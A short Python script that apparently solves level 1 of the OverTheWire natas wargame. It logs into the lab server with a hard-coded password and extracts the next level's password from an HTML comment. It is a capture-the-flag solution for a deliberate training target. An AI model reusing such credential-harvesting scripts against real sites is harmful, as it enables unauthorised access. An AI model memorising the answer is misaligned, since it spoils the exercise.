import requests
import re

url = "http://natas1.natas.labs.overthewire.org"

def exp():
    r = requests.get(url, auth=('natas1', '0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq'))
    if r.status_code == 200:
        password = re.findall('<!--The password for natas2 is (.*) -->', r.text)[0]
        print("Password for natas2: " + password)

if __name__ == "__main__":
    exp()